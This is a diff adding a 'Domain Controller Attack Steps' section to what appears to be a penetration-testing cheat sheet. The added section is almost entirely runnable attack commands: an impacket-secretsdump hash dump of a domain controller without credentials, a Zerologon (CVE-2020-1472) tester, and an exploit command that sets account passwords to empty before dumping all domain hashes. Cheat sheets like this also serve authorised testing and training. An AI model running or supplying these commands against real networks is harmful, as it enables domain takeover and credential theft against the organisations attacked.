@@ -6057,6 +6057,29 @@ With Rubeus, first get the ticket.kirbi
 .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:<BASE64_TICKET>
 ```
 
+###### Domain Controller Attack Steps
+
+No creds
+
+```c
+impacket-secretsdump -just-dc -no-pass DC_NAME\$@IP
+```
+
+Test for Zerologon
+https://github.com/SecuraBV/CVE-2020-1472
+
+```c
+python3 zerologon_tester.py DC_NAME IP
+```
+
+Exploit with CVE-2020-1472
+
+```c
+python3 cve-2020-1472-exploit.py DC_NAME IP // change account passwords to empty
+impacket-secretsdump -just-dc -no-pass DC_NAME\$@IP // dump hashes
+```
+
+
 ###### Domain Controller Syncronization (DCSync)
 
 ###### Prerequisites
